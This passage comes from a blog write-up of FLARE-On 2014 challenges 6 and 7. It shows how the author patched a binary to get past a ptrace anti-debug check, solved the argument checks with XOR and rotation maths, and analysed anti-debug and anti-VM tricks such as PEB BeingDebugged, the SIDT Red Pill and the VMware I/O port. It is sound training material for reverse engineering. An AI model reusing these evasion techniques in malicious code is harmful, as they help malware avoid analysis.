brk(0x18ee000)                          = 0x18ee000
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffd41ca2000
write(1, "na\n", 3na
)                     = 3
exit_group(423)                         = ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"..., "arg1", "arg2"], [/* 31 vars */]) = 0
uname({sys="Linux", node="kali", ...})  = 0
brk(0)                                  = 0x128d000
brk(0x128e1c0)                          = 0x128e1c0
arch_prctl(ARCH_SET_FS, 0x128d880)      = 0
brk(0x12af1c0)                          = 0x12af1c0
brk(0x12b0000)                          = 0x12b0000
ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fba3fee7000
write(1, "Program received signal SIGSEGV,"..., 52Program received signal SIGSEGV, Segmentation fault) = 52
exit_group(9001)                        = ?


{{< /codecaption >}}

Syscalls are similar in all traces except with two arguments. We can see that ``ptrace`` is being called in line 37. It's a common [anti-debug protection](http://reverseengineering.stackexchange.com/a/1931) in Linux. "[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime." So we need to bypass ``ptrace``. Searching for ``ptrace`` in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for ``syscall`` is moved to ``eax`` and then it is called. So I search for the text ``syscall`` in IDA and then commented each call according to [Linux System Call Table for x86_64](http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64) by ``@pixnbits``. ``ptrace`` is ``0x65``:

![ptrace call](/images/2014/flare/6-1.jpg "ptrace call")

Later I realized there was a much easier way to find it instead of discovering all calls. Running ``strace`` with ``-i`` switch will print the instruction pointer ~~at the time of call~~ after the syscall returns. Let's run ``ptrace`` on the binary with two arguments with this new swtich and look at the results.

{{< codecaption lang="bash" title="strace -i" >}}
$ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
[    7f87e90646e7] execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"..., "arg1", "arg2"], [/* 31 vars */]) = 0
[          4a9297] uname({sys="Linux", node="kali", ...}) = 0
[          4aa78a] brk(0)               = 0x1212000
[          4aa78a] brk(0x12131c0)       = 0x12131c0
[          45e3f5] arch_prctl(ARCH_SET_FS, 0x1212880) = 0
[          4aa78a] brk(0x12341c0)       = 0x12341c0
[          4aa78a] brk(0x1235000)       = 0x1235000
[          47431b] ptrace(PTRACE_TRACEME, 0, 0x1, 0) = -1 EPERM (Operation not permitted)
[          473e44] fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
[          47509a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f617785f000
[          473f50] write(1, "Program received signal SIGSEGV,"..., 52Program received signal SIGSEGV, Segmentation fault) = 52
[          473dd8] exit_group(9001)     = ?

{{< /codecaption >}}

Look at IP at the time of ``ptrace`` in line 9: ``47431b``. Now look at the IDA screenshot above.

So this function calls ``ptrace``. To find out where this function is being called, highlight it and press ``x`` in IDA. There is only one call.

{{< codecaption lang="nasm" title="bypassing ptrace" >}}
.text:000000000041F1F8 B9 00 00 00    mov     ecx, 0
.text:000000000041F1FD BA 01 00 00    mov     edx, 1
.text:000000000041F202 BE 00 00 00    mov     esi, 0
.text:000000000041F207 BF 00 00 00    mov     edi, 0
.text:000000000041F20C B8 00 00 00    mov     eax, 0
.text:000000000041F211 E8 9A 50 05    call    calls_ptrace
.text:000000000041F216 48 C1 E8 3F    shr     rax, 3Fh
.text:000000000041F21A 84 C0          test    al, al     ; if ptrace return value is zero jump to bypass_ptrace
.text:000000000041F21C 74 14          jz      short bypass_ptrace

.text:000000000041F21E BF 50 3B 4F    mov     edi, offset aProgramReceive ; "Program received signal SIGSEGV, Segmentation fault"
.text:000000000041F223 E8 B8 F9 03    call    sys_write_call
.text:000000000041F228 BF 29 23 00    mov     edi, 2329h
.text:000000000041F22D E8 5E F5 03    call    sub_45E790

{{< /codecaption >}}

Return value from ``ptrace`` is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the ``Option`` menu and then ``General``. Change the ``number of opcode bytes``.

To patch the binary to bypass ptrace we need to change the ``jz`` instruction in line 9 to ``jmp``. In this short jump ``0x74`` stands for ``jnz`` and ``0x14`` means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to ``jmp``, change ``0x74`` to ``0xEB``. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call ``lazy patching``. Search for opcodes for the last few instructions before and ``jnz`` in hex editor. In this case we are looking for ``48 C1 E8 3F 84 C0 74 14``. There is probably only one place in the binary with this sequence of bytes. Find it and change ``0x74`` to ``0xEB``. Now we have bypassed ``ptrace``. Another alternative is to replace the ``call calls_ptrace`` in line 6 with NOPs. NOP is short for No Operation and has the opcode ``0x90``. It actually stands for ``xchg eax, eax``. Both of them work.

So I bypassed ``ptrace``. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:

1. The binary prints ``no``. Put breakpoints on all ``sys_write`` calls and trace the print back
2. The application needs to manipulate the arguments somehow. Search for [string instructions](http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html), breakpoint them and see if  we hit one

I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a ``repne scasb``.

What does ``repne scasb`` do?  
``repne scasb`` will scan the string in ``di/edi/rdi`` for the byte (``scasb`` is the byte version of ``scas`` instruction) in ``ax/eax/rax`` and decrease ``cx/ecx/rcx`` by one after each execution. It stops if ``cx/ecx/rcx`` reaches zero or if a match is found.

{{< codecaption lang="nasm" title="strlen" >}}

.text:00000000004370CF mov     rax, [rbp+var_3C0]
.text:00000000004370D6 add     rax, 8
.text:00000000004370DA mov     rax, [rax]
.text:00000000004370DD mov     [rbp+var_3C8], 0FFFFFFFFFFFFFFFFh
.text:00000000004370E8 mov     rdx, rax
.text:00000000004370EB mov     eax, 0          ; null terminator
.text:00000000004370F0 mov     rcx, [rbp+var_3C8]   ; 0FFFFFFFFFFFFFFFFh
.text:00000000004370F7 mov     rdi, rdx        ; rdi = arg1
.text:00000000004370FA repne scasb             ; searching for null terminator
.text:00000000004370FA                         ; in other words strlen
.text:00000000004370FC mov     rax, rcx
.text:00000000004370FF not     rax
.text:0000000000437102 sub     rax, 1
.text:0000000000437106 cmp     rax, 0Ah        ; if ( strlen(arg1) == 10 ) jump
.text:000000000043710A jz      short strlen_arg1_equals_10

{{< /codecaption >}}

Null terminator or ``0x00`` is saved in eax in line 6. Line 7 has ``rcx``. We don't want ``rcx`` to reach zero before the end of the string. First argument is saved in ``rdi`` in line 8 and finally line 9 calls ``repne scasb``. This is basically ``strlen(arg1)``. In line 14, it is checked if the length of first argument is 10. If so we will jump.

{{< codecaption lang="nasm" title="strlen_arg1_equals_10" >}}

.text:0000000000437120 strlen_arg1_equals_10:  ; strlen(arg1) == 10 Decimal
.text:0000000000437120 mov     rax, [rbp+var_3C0]
.text:0000000000437127 add     rax, 8
.text:000000000043712B mov     rax, [rax]           ; rax = arg1
.text:000000000043712E mov     rdi, rax             ; rdi = arg1
.text:0000000000437131 call    sub_468BB0
.text:0000000000437136 mov     [rbp+arg1_2], rax    ; rax = arg1
.text:000000000043713D mov     [rbp+counter_?], 0
.text:0000000000437147 jmp     short loc_437177

{{< /codecaption >}}

We can see that arg1 is saved to ``rdi`` in line 5 and ``sub_468BB0`` is called. We can get inside ``sub_468BB0`` but it is basically ``malloc``. It allocates a string and initializes it with first argument. Return value is in ``rax`` which is a pointer to the newly created string. It is saved to ``[rbp+arg1_2]`` (I have renamed the variables). Finally there is an unconditional jump.

{{< codecaption lang="nasm" title="loc_437177" >}}

.text:0000000000437177 loc_437177:
.text:0000000000437177 mov     eax, [rbp+counter_?]
.text:000000000043717D movsxd  rsi, eax
.text:0000000000437180 mov     rax, [rbp+var_3C0]
.text:0000000000437187 add     rax, 8
.text:000000000043718B mov     rax, [rax]       ; rax = arg1
.text:000000000043718E mov     [rbp+var_3C8], 0FFFFFFFFFFFFFFFFh
.text:0000000000437199 mov     rdx, rax
.text:000000000043719C mov     eax, 0
.text:00000000004371A1 mov     rcx, [rbp+var_3C8]
.text:00000000004371A8 mov     rdi, rdx        ; rdi = arg1
.text:00000000004371AB repne scasb             ; strlen(arg1)
.text:00000000004371AD mov     rax, rcx
.text:00000000004371B0 not     rax
.text:00000000004371B3 sub     rax, 1
.text:00000000004371B7 cmp     rsi, rax        ; check if counter < 11
.text:00000000004371BA setb    al
.text:00000000004371BD test    al, al
.text:00000000004371BF jnz     short arg1_xor_0x56 ; if counter < 11 jump to for

.text:0000000000437149 for_arg1_xor_0x56
.text:0000000000437149 mov     eax, [rbp+counter_?]
.text:000000000043714F cdqe
.text:0000000000437151 add     rax, [rbp+arg1_2]
.text:0000000000437158 mov     edx, [rbp+counter_?]
.text:000000000043715E movsxd  rdx, edx
.text:0000000000437161 add     rdx, [rbp+arg1_2]
.text:0000000000437168 movzx   edx, byte ptr [rdx]
.text:000000000043716B xor     edx, 56h             ; xor with 0x56
.text:000000000043716E mov     [rax], dl
.text:0000000000437170 add     [rbp+counter_?], 1
; jumps back to top

{{< /codecaption >}}

We see another ``repne scasb``. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with ``0x56``.

{{< codecaption lang="cpp" title="loc_437177" >}}
for (int i=0; i<11 ; i++)
{
  arg1[i] = arg1[i] ^ 0x56;
}
{{< /codecaption >}}

If the loop is done, the ``jnz`` in line 19 will not be triggered and we land somewhere else.

{{< codecaption lang="nasm" title="Comparison" >}}

.text:00000000004371C1 mov     rax, [rbp+arg1_2] ; arg1 xor 0x56
.text:00000000004371C8 mov     edx, 0Ah
.text:00000000004371CD mov     esi, offset aBngcgDebd ; "bngcg`debd"
.text:00000000004371D2 mov     rdi, rax
.text:00000000004371D5 call    sub_400370       ; func(arg1 xor 0x56, hexlify(bngcg`debd) )
.text:00000000004371DA test    eax, eax         ; if function is successful, will return 0
.text:00000000004371DC jz      short loc_4371F2 ; jumps if return value = 0

{{< /codecaption >}}

Application loads the string ``bngcg`debd`` and compares the result of ``arg1 xor 0x56`` with it. If both are equal, ``jz`` in line 7 will be taken.  
We have already seen the transitive property of xor so we can calculate the correct value of first argument which is ``4815162342``. We could also patch the ``jz`` to ``jmp`` and enter any 10 characters for argument one.

{{< codecaption lang="cpp" title="First argument" >}}
arg1 xor 0x56 = "bngcg`debd"
arg1 = "bngcg`debd" xor 0x56
arg1 = "4815162342"
{{< /codecaption >}}

Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction ``mov  cs:byte_729AC2, al``. At that address, there are bytes being written and they are in ``base64``. I was stepping through until suddenly everything stopped and I saw that a ``nanosleep`` syscall was executed.

![nanosleep](/images/2014/flare/6-2.jpg "nanosleep")

I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and [sub_401164](https://twitter.com/FireEye/status/496757071644487680) was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).

{{< codecaption lang="nasm" title="Checking argument 2" >}}
[stack]:00007FFF3A5AC39C  ; ---------------------------------------------------------------------------

[stack]:00007FFF3A5AC39C  loc_7FFF3A5AC39C:
[stack]:00007FFF3A5AC39C  ror     byte ptr [rax], 0F2h            ; arg2[0] ror 0xF2 == 0x1B
[stack]:00007FFF3A5AC39F  cmp     byte ptr [rax], 1Bh
[stack]:00007FFF3A5AC3A2  jz      short loc_7FFF3A5AC3A6
[stack]:00007FFF3A5AC3A4  jmp     rbx
[stack]:00007FFF3A5AC3A6  ; ---------------------------------------------------------------------------
[stack]:00007FFF3A5AC3A6
[stack]:00007FFF3A5AC3A6  loc_7FFF3A5AC3A6:
[stack]:00007FFF3A5AC3A6  add     rax, 1
[stack]:00007FFF3A5AC3AA  xor     byte ptr [rax], 40h             ; arg2[1] xor 0x40 xor 0xF2 xor 0xB3 == 0x30
[stack]:00007FFF3A5AC3AD  xor     byte ptr [rax], 0F2h
[stack]:00007FFF3A5AC3B0  xor     byte ptr [rax], 0B3h
[stack]:00007FFF3A5AC3B3  cmp     byte ptr [rax], 30h
[stack]:00007FFF3A5AC3B6  jz      short loc_7FFF3A5AC3BA
[stack]:00007FFF3A5AC3B8  jmp     rbx
...

{{< /codecaption >}}

This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example ``arg2[0] ror 0xF2 must equal 0x1B``, otherwise ``jz`` will be called and application will terminate in ``loc_7FFF3A5AC3A6``. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.

Python does not have ``ror`` and ``rol`` binary operators so I stole them from [here](http://www.falatic.com/index.php/108/python-and-bitwise-rotation).

{{< codecaption lang="python" title="Second argument" >}}
# rol and ror implementations taken from
# http://www.falatic.com/index.php/108/python-and-bitwise-rotation

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits=8: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits=8: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

arg2 = []
for x in range(32):
    arg2.insert(x, 90)

arg2[0] = rol(0x1B,0xF2)

arg2[1] = (0x40 ^ 0xF2 ^ 0xB3 ^ 0x30)

arg2[2] = (0x1F ^ 0x71)

arg2[3] =  rol(0xB0 , 0xBC)  - 0xA3

arg2[4] =  ( 0xE8 + 0x79 )

arg2[5] = rol( 0xf6 + 0x28 , 0x82)

arg2[6] = rol( 0x1f - 0x2c, 0x4d ) + 0xb0

arg2[7] = ror( rol(0xAF - 0x3F , 0x2A) ^ 0xb8 , 0x99 ) - 0x54

arg2[8] = rol( 0x5D , 0xBA )

arg2[9] = rol(0x29 - 0x30,0x6C) ^ 0xED

arg2[10] = 0xb5 + 0xbf

arg2[11] = ror(ror(0xa5 - 0x63 + 0x31,0x7b) - 0x8c , 0xbc)

arg2[12] = ror ( ror ( ror ( 0xf3 , 0x98) ^ 0xAE, 0x16) , 0x20)

arg2[13] = rol ( 0xa6 - 0xD2  , 0x6E )

arg2[14] = 0x62 - 0x34

arg2[15] = (0x32 ^ 0xB2) - 0x62 + 0x10 - 0xCD

arg2[16] = rol ( 0xEB , 0x07) ^ 0x73 ^ 0xB7

arg2[17] = rol ( 0x0B + 0x4C - 0x5B , 0x36 ) + 0x61 - 0x34

arg2[18] = 0x9A - 0x5A

arg2[19] = rol(0x99, 0xa2)

arg2[20] = (0x2B + 0xE7) ^ 0x7E

arg2[21] = ( ( rol( ror(0xAF,0x57) , 0x4A) - 0x4E ) ^ 0x86 ) + 0xb8

# stopped after @fla

for index, item in enumerate(arg2):
    arg2[index] = item & 0xFF

print ''.join(map(chr, arg2))

# output
l1nhax.hurt.u5.a1l@flaZZZZZZZZZZ

{{< /codecaption >}}

Thanks [@Wartortell](https://twitter.com/Wartortell).

#### Level 6 flag: l1nhax.hurt.u5.a1l@flare-on.com

---

## <a name="ch7"></a> Challenge 7 - The Doge Strikes Back

```
Alright! Last one, can you get to the finish line? Keep it up!
-FLARE
```

By this time we have already fallen into a pre-check routine. Filename is ``d69650fa6d4825ec2ddeecdc6a92228d`` (MD5 hash) and googling brings up no notable results.

PE-Studio stuff:

* Win32 executable
* VirusTotal score: 5 / 55
* Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. ``wininet.dll`` is for the interwebz
* Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff
* Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting

I used ``API Monitor`` to observe application's API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of ``LocalAlloc`` and ``LocalFree`` calls. Right click any call and select ``Exclude > API Name`` to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example ``wininet.dll``. Under ``Monitored Processes`` navigate to ``Modules`` and then select a specific Dll to only see its calls. Let's search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select ``Online Help (MSDN)``.

I searched for [gethostbyname](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx) and found some interesting results:

![Dogecoin](/images/2014/flare/7-1.jpg "Dogecoin")

{{< codecaption lang="powershell" title="Calls for gethostbyname" >}}
gethostbyname ( "www.dogecoin.com" )
gethostbyname ( "e.root-servers.net" )
{{< /codecaption >}}

I was curious about these connections so I captured the traffic using ``Wireshark`` from launch to crash.

{{< codecaption lang="powershell" title="Traffic summary - some lines omitted" >}}

10.0.2.15	192.168.1.1	DNS	76	Standard query 0xbbc7  A www.dogecoin.com
192.168.1.1	10.0.2.15	DNS	106	Standard query response 0xbbc7  CNAME dogecoin.com A 204.232.175.78
10.0.2.15	192.168.1.1	DNS	78	Standard query 0xa75d  A e.root-servers.net
192.168.1.1	10.0.2.15	DNS	94	Standard query response 0xa75d  A 192.203.230.10
10.0.2.15	192.168.1.1	DNS	71	Standard query 0x7524  A twitter.com
192.168.1.1	10.0.2.15	DNS	135	Standard query response 0x7524  A 199.16.156.198 A 199.16.156.70 A 199.16.156.6 A 199.16.156.102
10.0.2.15	199.16.156.198	TLSv1	124	Client Hello
199.16.156.198	10.0.2.15	TLSv1	1474	Server Hello
199.16.156.198	10.0.2.15	TLSv1	382	Certificate
10.0.2.15	199.16.156.198	TLSv1	368	Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
199.16.156.198	10.0.2.15	TLSv1	101	Change Cipher Spec, Encrypted Handshake Message
10.0.2.15	199.16.156.198	TLSv1	260	Application Data
199.16.156.198	10.0.2.15	TLSv1	1431	Application Data
199.16.156.198	10.0.2.15	TLSv1	1474	Application Data

{{< /codecaption >}}

Query for ``www.dogecoin.com``, ``e.root-servers.net`` and ``www.twitter.com``. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let's search for "twitter" in API Monitor and we see this ``InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )``. Let's find that tweet and it looks normal.

![When embed tweet plugins for Octopress don't work](/images/2014/flare/7-2.jpg "When embed tweet plugins for Octopress don't work")

After migrating to [Hugo](https://gohugo.io), I can embed tweets now.

{{< tweet 484033515538116608 >}}


Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.

Here are some useful resources:

* [The "Ultimate" Anti-Debugging Reference (PDF)](http://pferrie.host22.com/papers/antidebug.pdf) by ``Peter Ferrie``. I had to remind myself what year it was after I visited [his website](http://pferrie.host22.com/)

* [Practical Malware Analysis book](http://practicalmalwareanalysis.com/) chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques

* [Five Anti-Analysis Tricks That Sometimes Fool Analysts](https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/) was published when I was writing this post

Find ``main`` and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let's start with the first one.

#### Function 1 - isDebuggerPresent?

{{< codecaption lang="nasm" title="" >}}
.text:00401B13 call    sub_401030   ; you are here
.text:00401B18 call    sub_4010C0
.text:00401B1D call    sub_401130
.text:00401B22 call    sub_4011D0
.text:00401B27 call    sub_4012A0
.text:00401B2C call    sub_401350
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0

{{< /codecaption >}}

![isDebuggerPresent](/images/2014/flare/7-3.jpg "isDebuggerPresent")

The result of a function call ``isDebuggerPresent`` is compared with 0 by ``test eax, eax``. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value ``0x106240`` or ``1073728`` is loaded into ``esi``. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing ``oh happy dayz`` with the data at ``byte_4131F8``. If we reach the end of the string it will restart from the first character. This loop will go on for ``1073728`` bytes which seems to be length of data starting at ``byte_4131F8``. I am going to rename it to ``blob`` and the number ``0x106240`` to ``blob_length``.

If debugger is present, we go left and the string ``oh happy dayz`` is xor-ed with the blob. If no debugger is present, we jump to the right branch and string ``the final countdown`` is xor-ed with the ``blob``.

{{< codecaption lang="python" title="isDebuggerPresent" >}}
if (isDebuggerPresent):
    blob = xor(blob,"oh happy dayz")
else:
    blob = xor(blob,"the final countdown")
{{< /codecaption >}}


#### Function 2 - BeingDebugged?

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    sub_4010C0    ; you are here
.text:00401B1D call    sub_401130
.text:00401B22 call    sub_4011D0
.text:00401B27 call    sub_4012A0
.text:00401B2C call    sub_401350
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0

{{< /codecaption >}}

Let's forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting ``var_4`` to zero. The next jump will only happen if ``var_4`` is zero which means that the last jump should not have happened. If the first compare succeeds (meaning ``[eax+2]`` is 1) then we go left and otherwise right.

![BeingDebugged](/images/2014/flare/7-4.jpg "BeingDebugged")

In both cases a string ``UNACCEPTABLE!`` or ``omglob`` are loaded along with address ``byte_4131F8`` before a function call ``sub_401000``. The address points to a long stream of data.

![blob](/images/2014/flare/7-5.jpg "blob")

Looking inside ``sub_401000``. At the start ``blob_length`` is loaded into ``ecx``. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing ``UNACCEPTABLE!`` with the data at ``byte_4131F8``. If we reach the end of the string it will restart from the first character. This loop will go on for ``1073728`` bytes which seems to be length of data starting at ``byte_4131F8``. So ``sub_401000`` is ``string xor blob``.

![xor function](/images/2014/flare/7-6.jpg "xor function")

Now let's go back to the first compare.

{{< codecaption lang="nasm" >}}
.text:004010C6 mov     [ebp+var_4], 1
.text:004010CD mov     eax, large fs:30h
.text:004010D3 cmp     byte ptr [eax+2], 1
{{< /codecaption >}}

What is the significance of ``fs:30h``? It is the ``Process Environment Block (PEB)`` in the ``Thread Information Block (TIB)``. According to [MSDN](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx) it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called ``BeingDebugged`` and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and ``UNACCEPTABLE!`` will be xor-ed with the ``blob`` otherwise ``omglob``. More information about the ``PEB`` can be found in the first section of the PDF ``1.NtGlobalFlag``.

{{< codecaption lang="cpp" title="PEB Structure" >}}

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

{{< /codecaption >}}

At this point we can rewrite this function in Python

{{< codecaption lang="python" title="BeingDebugged" >}}
if (BeingDebugged):
    blob = xor(blob,"UNACCEPTBALE!")
else:
    blob = xor(blob,"omglob")
{{< /codecaption >}}

#### Function 3 - VMware Detection via Red Pill

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B13 call    calls_isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    sub_401130       ; you are here
.text:00401B22 call    sub_4011D0
.text:00401B27 call    sub_4012A0
.text:00401B2C call    sub_401350
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0

{{< /codecaption >}}

![SIDT Red Pill](/images/2014/flare/7-7.jpg "SIDT Red Pill")

Jumping into ``sub_401130`` we see an old anti-VM technique. This is called [The Red Pill](http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html). Each CPU core has its own ``Interrupt Descriptor Table (IDT}``. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.

But how is this accomplished? Each core has one register called the ``Interrupt Descriptor Table Register (IDTR)`` that points to this location in memory. The userland (ring3) instruction``SIDT`` will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.

According to [this post](http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html) by Alain Zidouemba these are some of the addresses:

    |
    | VM Manager |   Address  |
    |------------|------------|
    | Windows    | 0x80FFFFFF |
    | Virtual PC | 0xE8XXXXXX |
    | VMware     | 0xFFXXXXXX |
    |

{{< codecaption lang="nasm" title="SIDT Red Pill" >}}

.text:00401138 sidt    fword ptr [ebp+var_8]
.text:0040113C mov     edi, dword ptr [ebp+var_8+2] ; edi = IDT address (in this run 0xBAB3C590)
.text:0040113F mov     esi, blob_length ; 0x106240
.text:00401145 mov     eax, edi                     ; eax = edi = IDT address
.text:00401147 and     eax, 0FF000000h              ; Getting the first byte of address
.text:0040114C xor     ecx, ecx
.text:0040114E cmp     eax, 0FF000000h              ; Comparing the first byte with 0xFF
.text:00401153 jnz     short loc_40119A

{{< /codecaption >}}

The above compares the first byte of IDT address with ``0xFF``. According to our table it is looking for ``VMware``. But we are not running it. If this check passes (meaning we are not running VMware) the string ``you're so bad`` is going to be xor-ed with the blob, otherwise it will be ``you're so good``. The address ``0xBAB3C590`` did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.

{{< codecaption lang="python" title="VMware Detection via Red Pill" >}}
if (running_in_vmware):
    blob = xor(blob,"you're so good")
else:
    blob = xor(blob,"you're so bad")
{{< /codecaption >}}

#### Function 4 - VMware Detection 2: Electric Boogaloo

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    sub_4011D0       ; you are here
.text:00401B27 call    sub_4012A0
.text:00401B2C call    sub_401350
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
.text:00401B47 call    sub_4016F0

{{< /codecaption >}}

What's in the box?

![VMware detection 2](/images/2014/flare/7-8.jpg "VMware detection 2")

Function will create its own exception handler, it will return the execution to ``loc_401232`` if an exception occurs. Then we have some interesting instructions. If we look at the [Malware Bytes](https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/) article, it is named ``VMware I/O port``. These are the magic instructions:

{{< codecaption lang="nasm" title="VMware I/O port check" >}}
.text:0040120E mov     eax, 564D5868h   ; save magic number to eax
.text:00401213 mov     ecx, 0Ah
.text:00401218 mov     dx, 5658h
.text:0040121C in      eax, dx          ; if in VMware, this instruction will save the magic number in ebx
.text:0040121D mov     [ebp+var_1C], ebx    ; executes if in VMware otherwise exception
{{< /codecaption >}}

It's a quick way to find if the application is running in a VMware VM. If ``in eax, dx`` is successful, it will save the magic number in ``ebx`` and then ``var_1C``. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then ``var_1C`` is compared to the magic number to determine if the application is in a VMware VM or not.

I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.

![VMware detection 2 continued](/images/2014/flare/7-9.jpg " VMware detection 2 continued")

The rest of the function is pretty simple, if the check fails ``0x66`` (character ``f``) will be xor-ed with the blob. If running in VMware ``0x01``.

{{< codecaption lang="python" title="VMWare Detection 2" >}}
if (running_in_vmware):
    blob = xor(blob,0x01)
else:
    blob = xor(blob,0x66)
{{< /codecaption >}}

#### Function 5 - OutputDebugString

{{< codecaption lang="nasm" >}}
.text:00401B13 call    isDebuggerPresent
.text:00401B18 call    BeingDebugged
.text:00401B1D call    VMware_detection
.text:00401B22 call    Electric_Boogaloo
.text:00401B27 call    sub_4012A0       ; you are here
.text:00401B2C call    sub_401350
.text:00401B31 call    sub_4013F0
.text:00401B36 call    sub_401460
.text:00401B3B mov     eax, [esi]
.text:00401B3D call    sub_4014F0
.text:00401B42 call    sub_401590
